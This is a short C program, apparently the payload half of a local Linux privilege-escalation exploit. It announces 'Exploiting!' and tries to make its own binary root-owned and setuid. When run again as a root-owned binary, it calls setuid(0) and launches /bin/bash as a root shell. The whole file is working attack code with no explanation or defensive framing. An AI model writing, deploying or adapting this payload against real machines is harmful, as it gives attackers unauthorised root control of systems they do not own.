#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
        printf("Exploiting!\n");
        int fd = open("/proc/self/exe", O_RDONLY);
        struct stat st;
        fstat(fd, &st);
        if (st.st_uid != 0)
        {
                fchown(fd, 0, st.st_gid);
                fchmod(fd, S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
        }
        else
        {
                setuid(0);
                execve("/bin/bash",NULL,NULL);
        }
return 0;
}
